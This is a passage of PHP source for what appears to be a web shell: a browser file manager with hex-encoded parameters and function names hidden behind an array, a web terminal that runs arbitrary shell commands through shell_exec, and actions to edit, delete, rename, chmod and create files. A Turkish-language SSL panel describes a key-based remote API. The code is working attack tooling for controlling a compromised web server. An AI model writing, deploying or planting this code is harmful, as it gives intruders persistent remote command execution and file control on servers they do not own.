        <i class="fas fa-folder-open"></i> Path:
        <?php
        $ps = $fc[4]("/(\\\|\/)/", $p);
        foreach ($ps as $k => $v) {
            if ($k == 0 && $v == "") {
                echo "<a href=\"?p=2f\">~</a>/"; continue;
            }
            if ($v == "") continue;
            echo "<a href=\"?p=";
            for ($i = 0; $i <= $k; $i++) {
                echo hex($ps[$i]);
                if ($i != $k) echo "2f";
            }
            echo "\">{$v}</a>/";
        }
        ?>
    </div>

    <div class="content-area">
        <?php if (!isset($_GET["a"])): ?>
            <table class="table table-hover">
                <thead>
                    <tr>
                        <th scope="col">Name</th>
                        <th scope="col">Size</th>
                        <th scope="col">Permissions</th>
                        <th scope="col">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $scD = $fc[5]($scD($p), [".", ".."]);
                    foreach ($scD as $d) {
                        if (!$fc[6]("$p/$d")) continue;
                        echo "<tr>
                            <td><a href=\"?p=".hex("$p/$d")."\"><i class=\"fas fa-folder folder-icon\"></i> {$d}</a></td>
                            <td>N/A</td>
                            <td class=\"".(($fc[8]("$p/$d")) ? "permission-writable" : (!$fc[9]("$p/$d") ? "permission-denied" : ""))."\">".perms("$p/$d")."</td>
                            <td>
                                <a href=\"?p=".hex($p)."&a=".hex("chmod")."&n=".hex($d)."&t=d\"><i class=\"fas fa-key action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\"><i class=\"fas fa-pencil-alt action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\"><i class=\"fas fa-trash-alt action-icon\"></i></a>
                            </td>
                        </tr>";
                    }
                    foreach ($scD as $f) {
                        if (!$fc[7]("$p/$f")) continue;
                        $sz = $fc[10]("$p/$f")/1024;
                        $sz = round($sz, 3);
                        $sz = ($sz > 1024) ? round($sz/1024, 2)." MB" : $sz." KB";
                        echo "<tr>
                            <td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\"><i class=\"fas fa-file file-icon\"></i> {$f}</a></td>
                            <td>{$sz}</td>
                            <td class=\"".(($fc[8]("$p/$f")) ? "permission-writable" : (!$fc[9]("$p/$f") ? "permission-denied" : ""))."\">".perms("$p/$f")."</td>
                            <td>
                                <a href=\"?p=".hex($p)."&a=".hex("chmod")."&n=".hex($f)."&t=f\"><i class=\"fas fa-key action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\"><i class=\"fas fa-edit action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\"><i class=\"fas fa-pencil-alt action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&n=".hex($f)."&download\"><i class=\"fas fa-download action-icon\"></i></a>
                                <a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\"><i class=\"fas fa-trash-alt action-icon\"></i></a>
                            </td>
                        </tr>";
                    }
                    ?>
                </tbody>
            </table>
        <?php else: if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
            <div class="px-2 py-2">
                <?php if ($a == "delete") {
                    $loc = $p.'/'.nhx($_GET["n"]);
                    if ($_GET["t"] == "d") {
                        deldir($loc);
                        if (!$fc[12]($loc)) { a("Folder deleted successfully"); } else { a("Failed to delete", 0); }
                    }
                    if ($_GET["t"] == "f") {
                        unlink($loc);
                        if (!$fc[12]($loc)) { a("File deleted successfully"); } else { a("Failed to delete", 0); }
                    }
                } ?>

                <?php if ($a == "terminal"): 
                    if (!isset($_SESSION['terminal_history'])) {
                        $_SESSION['terminal_history'] = [['type' => 'system', 'content' => "Welcome to Web Terminal."]];
                    }
                    if (isset($_POST['command'])) {
                        $command = trim($_POST['command']);
                        $_SESSION['terminal_history'][] = ['type' => 'command', 'content' => $command];
                        if ($command == 'clear' || $command == 'cls') {
                            $_SESSION['terminal_history'] = [];
                        } elseif ($command == 'exit' || $command == 'quit') {
                            $_SESSION['exit_requested'] = true;
                        } else {
                            $output = shell_exec(escapeshellcmd($command) . " 2>&1");
                            $_SESSION['terminal_history'][] = ['type' => 'output', 'content' => '<pre>' . htmlspecialchars($output ?: 'Command executed.') . '</pre>'];
                        }
                    }
                    $exitRequested = isset($_SESSION['exit_requested']) && $_SESSION['exit_requested'];
                    if ($exitRequested) unset($_SESSION['exit_requested']);
                ?>
                    <h5><i class="fas fa-terminal"></i> Terminal</h5>
                    <div id="terminal-container" class="terminal-container">
                        <div class="terminal-output">
                        <?php foreach ($_SESSION['terminal_history'] as $entry): ?>
                            <?php if ($entry['type'] == 'command'): ?>
                                <div><span style="color:#00ff00;">$</span> <?= htmlspecialchars($entry['content']) ?></div>
                            <?php else: ?>
                                <div><?= $entry['content'] ?></div>
                            <?php endif; ?>
                        <?php endforeach; ?>
                        </div>
                        <form method="post" class="d-flex align-items-center">
                            <span style="color:#00ff00;">$</span>&nbsp;
                            <input type="text" name="command" class="terminal-input" autocomplete="off" autofocus>
                        </form>
                    </div>
                    <div class="mt-3">
                        <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                    </div>
                    <?php if ($exitRequested): ?>
                    <script>window.location.href = "?p=<?= hex($p) ?>";</script>
                    <?php endif; ?>
                <?php endif; ?>

                <?php if ($a == "ssl"): 
                    $sslInfo = xsh_api_ssl_check();
                    if (isset($_POST['ssl_renew'])) {
                        $renewResult = xsh_api_ssl_renew($_POST['ssl_domain'] ?? null, $_POST['ssl_method'] ?? 'auto');
                    }
                ?>
                    <h5><i class="fas fa-lock"></i> SSL Sertifikası Yönetimi</h5>
                    
                    <div class="card mb-3" style="background: var(--main-bg); border: 1px solid var(--border-color);">
                        <div class="card-body">
                            <h6>📊 Mevcut Durum</h6>
                            <table class="table table-sm">
                                <tr><td>Domain:</td><td><strong><?= $sslInfo['domain'] ?></strong></td></tr>
                                <tr><td>SSL Aktif:</td><td><?= $sslInfo['ssl_enabled'] ? '<span style="color:var(--success-color)">✓ Evet</span>' : '<span style="color:var(--danger-color)">✗ Hayır</span>' ?></td></tr>
                                <tr><td>Certbot:</td><td><?= $sslInfo['certbot_available'] ? '<span style="color:var(--success-color)">✓ Mevcut</span>' : '<span style="color:var(--warning-color)">✗ Yok</span>' ?></td></tr>
                                <tr><td>acme.sh:</td><td><?= $sslInfo['acme_available'] ? '<span style="color:var(--success-color)">✓ Mevcut</span>' : '<span style="color:var(--warning-color)">✗ Yok</span>' ?></td></tr>
                                <?php if (isset($sslInfo['cert_valid_to'])): ?>
                                <tr><td>Sertifika Bitiş:</td><td><?= $sslInfo['cert_valid_to'] ?> (<?= $sslInfo['cert_days_left'] ?> gün kaldı)</td></tr>
                                <tr><td>Durum:</td><td><?= $sslInfo['cert_expired'] ? '<span style="color:var(--danger-color)">⚠ SÜRESI DOLMUŞ!</span>' : '<span style="color:var(--success-color)">✓ Geçerli</span>' ?></td></tr>
                                <?php endif; ?>
                                <tr><td>Webroot:</td><td><code><?= $sslInfo['webroot'] ?></code></td></tr>
                            </table>
                        </div>
                    </div>
                    
                    <?php if (isset($renewResult)): ?>
                    <div class="alert <?= $renewResult['success'] ? 'alert-success' : 'alert-danger' ?>" style="background: <?= $renewResult['success'] ? 'rgba(16,185,129,0.2)' : 'rgba(248,81,73,0.2)' ?>; border: none;">
                        <strong><?= $renewResult['success'] ? '✓ Başarılı!' : '✗ Hata!' ?></strong><br>
                        <?php if ($renewResult['success']): ?>
                            SSL sertifikası <?= $renewResult['method_used'] ?? 'başarıyla' ?> ile yenilendi.
                        <?php else: ?>
                            <?= $renewResult['error'] ?? 'Bilinmeyen hata' ?>
                            <?php if (isset($renewResult['certbot_error'])): ?>
                                <pre style="font-size:11px; margin-top:10px;"><?= htmlspecialchars($renewResult['certbot_error']) ?></pre>
                            <?php endif; ?>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>
                    
                    <div class="card" style="background: var(--main-bg); border: 1px solid var(--border-color);">
                        <div class="card-body">
                            <h6>🔄 SSL Yenile / Kur</h6>
                            <form method="post">
                                <div class="mb-3">
                                    <label class="form-label">Domain:</label>
                                    <input type="text" name="ssl_domain" class="form-control" value="<?= $sslInfo['domain'] ?>" placeholder="example.com">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Yöntem:</label>
                                    <select name="ssl_method" class="form-control">
                                        <option value="auto">Otomatik (Certbot veya acme.sh)</option>
                                        <option value="certbot">Sadece Certbot</option>
                                        <option value="acme">Sadece acme.sh</option>
                                    </select>
                                </div>
                                <button type="submit" name="ssl_renew" class="btn btn-custom"><i class="fas fa-sync"></i> SSL Yenile</button>
                                <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Geri</a>
                            </form>
                        </div>
                    </div>
                    
                    <div class="mt-3 p-3" style="background: var(--main-bg); border: 1px solid var(--border-color); border-radius: 6px;">
                        <h6>📖 API Kullanımı</h6>
                        <code>?api=1&key=KEY&action=ssl_check</code> → SSL durumu kontrol<br>
                        <code>?api=1&key=KEY&action=ssl_renew&domain=example.com</code> → SSL yenile<br>
                        <code>?api=1&key=KEY&action=ssl_install_acme</code> → acme.sh kur
                    </div>
                <?php endif; ?>

                <?php if ($a == "edit"): 
                    $file = $p.'/'.nhx($_GET["n"]);
                    $content = $fc[14]($file);
                    if (isset($_POST['edit_file'])) {
                        if ($fc[13]($file, $_POST['file_content'])) { a("File saved"); } else { a("Save failed", 0); }
                    }
                ?>
                    <h5><i class="fas fa-edit"></i> Edit: <?= nhx($_GET["n"]) ?></h5>
                    <form method="post">
                        <textarea name="file_content" class="form-control" style="height: 400px;"><?= $fc[18]($content) ?></textarea>
                        <div class="mt-3">
                            <button type="submit" name="edit_file" class="btn btn-custom"><i class="fas fa-save"></i> Save</button>
                            <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        </div>
                    </form>
                <?php endif; ?>

                <?php if ($a == "view"): ?>
                    <h5><i class="fas fa-file-alt"></i> View: <?= nhx($_GET["n"]) ?></h5>
                    <textarea class="form-control" rows="15" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea>
                    <div class="mt-3">
                        <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        <a href="?p=<?= hex($p) ?>&a=<?= hex("edit") ?>&n=<?= $_GET["n"] ?>" class="btn btn-custom"><i class="fas fa-edit"></i> Edit</a>
                    </div>
                <?php endif; ?>

                <?php if ($a == "rename"): 
                    $item = nhx($_GET["n"]);
                    if (isset($_POST['rename_submit'])) {
                        if ($fc[16]("$p/$item", "$p/".$_POST['new_name'])) { a("Renamed"); } else { a("Rename failed", 0); }
                    }
                ?>
                    <h5><i class="fas fa-pencil-alt"></i> Rename: <?= $item ?></h5>
                    <form method="post">
                        <input type="text" name="new_name" class="form-control" value="<?= $item ?>">
                        <div class="mt-3">
                            <button type="submit" name="rename_submit" class="btn btn-custom"><i class="fas fa-save"></i> Rename</button>
                            <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        </div>
                    </form>
                <?php endif; ?>

                <?php if ($a == "newFile"): 
                    if (isset($_POST['newfile_submit'])) {
                        $filename = $_POST['filename'];
                        if (!$fc[12]("$p/$filename")) {
                            if ($fc[13]("$p/$filename", $_POST['file_content'])) { a("File created"); } else { a("Create failed", 0); }
                        } else { a("File exists", 0); }
                    }
                ?>
                    <h5><i class="fas fa-file-medical"></i> New File</h5>
                    <form method="post">
                        <input type="text" name="filename" class="form-control mb-3" placeholder="Filename" required>
                        <textarea name="file_content" class="form-control" style="height: 300px;"></textarea>
                        <div class="mt-3">
                            <button type="submit" name="newfile_submit" class="btn btn-custom"><i class="fas fa-save"></i> Create</button>
                            <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        </div>
                    </form>
                <?php endif; ?>

                <?php if ($a == "newDir"): 
                    if (isset($_POST['newdir_submit'])) {
                        $dirname = $_POST['dirname'];
                        if (!$fc[12]("$p/$dirname")) {
                            if ($fc[15]("$p/$dirname", 0755)) { a("Directory created"); } else { a("Create failed", 0); }
                        } else { a("Directory exists", 0); }
                    }
                ?>
                    <h5><i class="fas fa-folder-plus"></i> New Directory</h5>
                    <form method="post">
                        <input type="text" name="dirname" class="form-control" placeholder="Directory name" required>
                        <div class="mt-3">
                            <button type="submit" name="newdir_submit" class="btn btn-custom"><i class="fas fa-save"></i> Create</button>
                            <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        </div>
                    </form>
                <?php endif; ?>

                <?php if ($a == "chmod"): 
                    $target = $p.'/'.nhx($_GET["n"]);
                    $octal_perms = substr(sprintf('%o', fileperms($target)), -4);
                    if (isset($_POST['chmod_submit']) && !empty($_POST['numeric_mode'])) {
                        if (chmod($target, octdec($_POST['numeric_mode']))) { a("Permissions changed"); } else { a("Change failed", 0); }
                    }
                ?>
                    <h5><i class="fas fa-key"></i> Chmod: <?= nhx($_GET["n"]) ?></h5>
                    <p>Current: <strong><?= $octal_perms ?></strong></p>
                    <form method="post">
                        <input type="text" name="numeric_mode" class="form-control" placeholder="e.g. 0755" maxlength="4">
                        <div class="mt-3">
                            <button type="submit" name="chmod_submit" class="btn btn-custom"><i class="fas fa-save"></i> Apply</button>
                            <a href="?p=<?= hex($p) ?>" class="btn btn-secondary"><i class="fas fa-arrow-left"></i> Back</a>
                        </div>
                    </form>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

    <div class="footer">&copy; <?= date("Y") ?>  + API</div>

    <script>
        document.querySelectorAll('.delete').forEach(function(el) {
            el.addEventListener('click', function(e) {
                e.preventDefault();
                let type = this.getAttribute('data-type');
                const href = this.getAttribute('href');
                swal({title: "Delete?", text: "Delete this " + type + "?", icon: "warning", buttons: true, dangerMode: true})
                .then((ok) => { if (ok) window.location.href = href + "&t=" + (type == "folder" ? "d" : "f"); });
            });
        });
    </script>
    <?php endif; ?>
</body>
</html>
